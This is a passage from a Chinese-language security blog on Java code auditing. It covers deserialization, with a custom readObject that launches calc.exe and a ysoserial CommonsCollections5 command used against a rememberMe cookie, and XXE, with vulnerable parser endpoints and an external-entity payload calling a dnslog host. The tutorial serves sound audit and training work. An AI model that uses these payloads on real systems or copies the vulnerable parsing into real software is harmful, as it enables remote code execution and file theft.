class="token operator">=</span> name<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getAge</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> age<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setAge</span><span class="token punctuation">(</span><span class="token keyword">int</span> age<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> String <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string">"student{"</span> <span class="token operator">+</span>                <span class="token string">"id="</span> <span class="token operator">+</span> id <span class="token operator">+</span>                <span class="token string">", name='"</span> <span class="token operator">+</span> name <span class="token operator">+</span> <span class="token string">'\''</span> <span class="token operator">+</span>                <span class="token string">", age="</span> <span class="token operator">+</span> age <span class="token operator">+</span>                <span class="token string">'}'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>实现序列化和反序列化操作：Main.java</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> org<span class="token punctuation">.</span>root<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> ClassNotFoundException <span class="token punctuation">{</span>        Student student <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Student</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">"mike"</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        SerializeUtil<span class="token punctuation">.</span><span class="token function">Serialize</span><span class="token punctuation">(</span>student<span class="token punctuation">)</span><span class="token punctuation">;</span>        Object obj<span class="token operator">=</span>SerializeUtil<span class="token punctuation">.</span><span class="token function">Deserialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">SerializeUtil</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//序列化</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">Serialize</span><span class="token punctuation">(</span>Object obj<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">{</span>        OutputStream out <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"1.ser"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ObjectOutputStream objOut <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>out<span class="token punctuation">)</span><span class="token punctuation">;</span>        objOut<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>        objOut<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//反序列化</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> Object <span class="token function">Deserialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> ClassNotFoundException <span class="token punctuation">{</span>        InputStream in <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"1.ser"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ObjectInputStream objIn <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span>in<span class="token punctuation">)</span><span class="token punctuation">;</span>        Object obj <span class="token operator">=</span> objIn<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> obj<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果如下：</p><p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221024233727062.png"></p><h2 id="0x03-注意点"><a href="#0x03-注意点" class="headerlink" title="0x03 注意点"></a>0x03 注意点</h2><ul><li>要实现序列化，将需要序列化的类实现Serializable即可；</li><li>对于父类的处理，如果父类没有实现Serializable接口，则其必须有默认的构造器（即无参构造器）。否则编译的时候就会报错，在反序列化的过程中，默认的构造器会被调用；</li><li>声明为static和transient类型的成员数据不能被序列化。因为static代表类的状态， transient代表对象的临时数据；</li><li>如果父类能够被序列化，子类也可以被序列化。</li></ul><h2 id="0x04-自定义反序列化"><a href="#0x04-自定义反序列化" class="headerlink" title="0x04 自定义反序列化"></a>0x04 自定义反序列化</h2><p>自定义反序列化，其实就是重写readObject方法，通过这种方式我们来改写Student类，进而使其弹出计算器。</p><p>Student.java</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> org<span class="token punctuation">.</span>root<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOException<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>Serializable<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Student</span> <span class="token keyword">implements</span> <span class="token class-name">Serializable</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> id<span class="token punctuation">;</span>    <span class="token keyword">private</span> String name<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> age<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">Student</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token function">Student</span><span class="token punctuation">(</span><span class="token keyword">int</span> id<span class="token punctuation">,</span> String name<span class="token punctuation">,</span> <span class="token keyword">int</span> age<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>id <span class="token operator">=</span> id<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getId</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> id<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setId</span><span class="token punctuation">(</span><span class="token keyword">int</span> id<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>id <span class="token operator">=</span> id<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> String <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> name<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setName</span><span class="token punctuation">(</span>String name<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getAge</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> age<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setAge</span><span class="token punctuation">(</span><span class="token keyword">int</span> age<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> String <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string">"student{"</span> <span class="token operator">+</span>                <span class="token string">"id="</span> <span class="token operator">+</span> id <span class="token operator">+</span>                <span class="token string">", name='"</span> <span class="token operator">+</span> name <span class="token operator">+</span> <span class="token string">'\''</span> <span class="token operator">+</span>                <span class="token string">", age="</span> <span class="token operator">+</span> age <span class="token operator">+</span>                <span class="token string">'}'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">readObject</span><span class="token punctuation">(</span>java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>ObjectInputStream in<span class="token punctuation">)</span> <span class="token keyword">throws</span> ClassNotFoundException<span class="token punctuation">,</span> IOException <span class="token punctuation">{</span>        in<span class="token punctuation">.</span><span class="token function">defaultReadObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//调用原始的readOject方法</span>        Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"calc.exe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行结果如下：</p><p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221025002204310.png"></p><h2 id="0x04-漏洞审计"><a href="#0x04-漏洞审计" class="headerlink" title="0x04 漏洞审计"></a>0x04 漏洞审计</h2><p>在平时的代码审计过程中，我们可以快速定位到以下可能存在问题的代码块：</p><pre><code>ObjectInputStream.readObject()ObjectInputStream.readUnshared()XMLDecoder.readObject()Yaml.loadXStream.fromXMLObjectMapper.readValueJSON.parseObject</code></pre><p>当我们通过搜索关键字找到入口点后，便可以开始审计是否存在参数可控，我们以开源项目java-sec-code作为一个例子来审计</p><p>通过搜索关键字<code>readObject</code>定位到关键demo</p><pre class="line-numbers language-java"><code class="language-java"><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/deserialize"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Deserialize</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token keyword">final</span> Logger logger <span class="token operator">=</span> LoggerFactory<span class="token punctuation">.</span><span class="token function">getLogger</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/rememberMe/vuln"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> String <span class="token function">rememberMeVul</span><span class="token punctuation">(</span>HttpServletRequest request<span class="token punctuation">)</span>            <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> ClassNotFoundException <span class="token punctuation">{</span>        Cookie cookie <span class="token operator">=</span> <span class="token function">getCookie</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> Constants<span class="token punctuation">.</span>REMEMBER_ME_COOKIE<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>null <span class="token operator">==</span> cookie<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token string">"No rememberMe cookie. Right?"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        String rememberMe <span class="token operator">=</span> cookie<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> decoded <span class="token operator">=</span> Base64<span class="token punctuation">.</span><span class="token function">getDecoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>rememberMe<span class="token punctuation">)</span><span class="token punctuation">;</span>        ByteArrayInputStream bytes <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>decoded<span class="token punctuation">)</span><span class="token punctuation">;</span>        ObjectInputStream in <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span>bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>        in<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        in<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string">"Are u ok?"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>定位到readobject()，可以看出是对decoded进行了反序列化，跟进decoded参数，可以发现参数通过Cookie中的参数rememberMe，且是通过base64解密传递进来的。到此整个漏洞路线就很清晰了，首先程序通过<code>getCookie(request, Constants.REMEMBER_ME_COOKIE)</code>获取cookie，然后通过getValue()获取参数rememberMe，对其base64解密后赋值给decoded，然后通过ByteArrayInputStream将decoded转为字节组后传入ObjectInputStream中，最后通过<code>readObject()</code>执行反序列化。复现过程如下：</p><p>1、通过ysoserial生成有效载荷</p><pre><code>java -jar ysoserial.jar CommonsCollections5 &quot;calc&quot; | base64</code></pre><p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221025012530019.png"></p><p>2、将生成的base64填入到rememberMe字段，成功弹出计算器</p><p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221025012501522.png"></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java代码审计之XXE</title>
      <link href="/2022/10/19/java-dai-ma-shen-ji-zhi-xxe/"/>
      <url>/2022/10/19/java-dai-ma-shen-ji-zhi-xxe/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>生命可以归结为一种简单的选择：要么忙于生存，要么赶着。</p><h2 id="0x01-什么是XXE？"><a href="#0x01-什么是XXE？" class="headerlink" title="0x01 什么是XXE？"></a>0x01 什么是XXE？</h2><p>XXE（XML外部实体注入，XML External Entity) ，在应用程序解析XML输入时，当允许引用外部实体时，可构造恶意内容，导致读取任意文件、探测内网端口、攻击内网网站、发起DoS拒绝服务攻击、执行系统命令等。Java中的XXE支持sun.net.<a href="http://www.protocol/">www.protocol</a> 里的所有协议：http，https，file，ftp，mailto，jar，netdoc。一般利用file协议读取文件，利用http协议探测内网，没有回显时可组合利用file协议和ftp协议来读取文件。</p><h2 id="0x02-XXE审计函数"><a href="#0x02-XXE审计函数" class="headerlink" title="0x02 XXE审计函数"></a>0x02 XXE审计函数</h2><p>本篇文章基于<code>https://github.com/JoyChou93/java-sec-code</code>来做分析。</p><p>在java中，xml解析的函数有以下几种：</p><pre><code>javax.xml.parsers.DocumentBuilderFactory;javax.xml.parsers.SAXParserjavax.xml.transform.TransformerFactoryjavax.xml.validation.Validatorjavax.xml.validation.SchemaFactoryjavax.xml.transform.sax.SAXTransformerFactoryjavax.xml.transform.sax.SAXSourceorg.xml.sax.XMLReaderDocumentHelper.parseTextDocumentBuilderorg.xml.sax.helpers.XMLReaderFactoryorg.dom4j.io.SAXReaderorg.jdom.input.SAXBuilderorg.jdom2.input.SAXBuilderjavax.xml.bind.Unmarshallerjavax.xml.xpath.XpathExpressionjavax.xml.stream.XMLStreamReaderorg.apache.commons.digester3.Digesterrg.xml.sax.SAXParseExceptionpublicId</code></pre><p>我们拿几种比较常见的来分析下。</p><h3 id="XMLReader"><a href="#XMLReader" class="headerlink" title="XMLReader"></a>XMLReader</h3><p>XMLReader接口是一种通过回调读取XML文档的接口，如果使用默认的解析方法并且未对XML进行过滤时，就会产生不回显的XXE漏洞。</p><pre class="line-numbers language-java"><code class="language-java"><span class="token annotation punctuation">@PostMapping</span><span class="token punctuation">(</span><span class="token string">"/xmlReader/vuln"</span><span class="token punctuation">)</span><span class="token keyword">public</span> String <span class="token function">xmlReaderVuln</span><span class="token punctuation">(</span>HttpServletRequest request<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">try</span> <span class="token punctuation">{</span>        String body <span class="token operator">=</span> WebUtils<span class="token punctuation">.</span><span class="token function">getRequestBody</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">;</span>        logger<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span>        XMLReader xmlReader <span class="token operator">=</span> XMLReaderFactory<span class="token punctuation">.</span><span class="token function">createXMLReader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        xmlReader<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">InputSource</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringReader</span><span class="token punctuation">(</span>body<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// parse xml</span>        <span class="token keyword">return</span> <span class="token string">"xmlReader xxe vuln code"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>        logger<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> EXCEPT<span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过以下payload，我们可以成功触发XXE漏洞</p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE Drunkbaby [ &lt;!ENTITY xxe SYSTEM &quot;http://i2m2ti.dnslog.cn&quot;&gt; ]&gt;&lt;root&gt;&amp;xxe;&lt;/root&gt;</code></pre><p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221020145201149.png"></p><h3 id="SAXBuilder"><a href="#SAXBuilder" class="headerlink" title="SAXBuilder"></a>SAXBuilder</h3><p>SAXBuilder是一个JDOM解析器，使用了第三方SAX解析器来处理解析任务，当使用默认的解析方法并且未对XML进行过滤时，就会产生不回显的XXE漏洞。</p><pre class="line-numbers language-java"><code class="language-java"><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"/SAXBuilder/vuln"</span><span class="token punctuation">,</span> method <span class="token operator">=</span> RequestMethod<span class="token punctuation">.</span>POST<span class="token punctuation">)</span><span class="token keyword">public</span> String <span class="token function">SAXBuilderVuln</span><span class="token punctuation">(</span>HttpServletRequest request<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">try</span> <span class="token punctuation">{</span>        String body <span class="token operator">=</span> WebUtils<span class="token punctuation">.</span><span class="token function">getRequestBody</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">;</span>        logger<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span>        SAXBuilder builder <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SAXBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// org.jdom2.Document document</span>        builder<span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">InputSource</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringReader</span><span class="token punctuation">(</span>body<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// cause xxe</span>        <span class="token keyword">return</span> <span class="token string">"SAXBuilder xxe vuln code"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>        logger<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> EXCEPT<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="SAXReader"><a href="#SAXReader" class="headerlink" title="SAXReader"></a>SAXReader</h3><p>SAXReader属于第三方库，当使用默认的解析方法并且未对XML进行过滤时，就会产生不回显的XXE漏洞。</p><pre class="line-numbers language-java"><code class="language-java"><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"/SAXReader/vuln"</span><span class="token punctuation">,</span> method <span class="token operator">=</span> RequestMethod<span class="token punctuation">.</span>POST<span class="token punctuation">)</span><span class="token keyword">public</span> String <span class="token function">SAXReaderVuln</span><span class="token punctuation">(</span>HttpServletRequest request<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">try</span> <span class="token punctuation">{</span>        String body <span class="token operator">=</span> WebUtils<span class="token punctuation">.</span><span class="token function">getRequestBody</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">;</span>        logger<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span>        SAXReader reader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SAXReader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// org.dom4j.Document document</span>        reader<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">InputSource</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringReader</span><span class="token punctuation">(</span>body<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// cause xxe</span>    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>        logger<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> EXCEPT<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token string">"SAXReader xxe vuln code"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>SAXParserFactory</p><p>SAXParserFactory使应用程序能够配置和获取基于SAX的解析器以解析XML文档，当使用默认的解析方法并且未对XML进行过滤时，就会产生不回显的XXE漏洞。</p><pre class="line-numbers language-java"><code class="language-java"><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"/SAXParser/vuln"</span><span class="token punctuation">,</span> method <span class="token operator">=</span> RequestMethod<span class="token punctuation">.</span>POST<span class="token punctuation">)</span><span class="token keyword">public</span> String <span class="token function">SAXParserVuln</span><span class="token punctuation">(</span>HttpServletRequest request<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">try</span> <span class="token punctuation">{</span>        String body <span class="token operator">=</span> WebUtils<span class="token punctuation">.</span><span class="token function">getRequestBody</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">;</span>        logger<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span>        SAXParserFactory spf <span class="token operator">=</span> SAXParserFactory<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        SAXParser parser <span class="token operator">=</span> spf<span class="token punctuation">.</span><span class="token function">newSAXParser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        parser<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">InputSource</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringReader</span><span class="token punctuation">(</span>body<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">DefaultHandler</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// parse xml</span>        <span class="token keyword">return</span> <span class="token string">"SAXParser xxe vuln code"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>        logger<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> EXCEPT<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Digester"><a href="#Digester" class="headerlink" title="Digester"></a>Digester</h3><p>Digester类通过将XML映射成java类来简化XML的处理，其触发的XXE是没有回显的。</p><pre class="line-numbers language-java"><code class="language-java"><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"/Digester/vuln"</span><span class="token punctuation">,</span> method <span class="token operator">=</span> RequestMethod<span class="token punctuation">.</span>POST<span class="token punctuation">)</span><span class="token keyword">public</span> String <span class="token 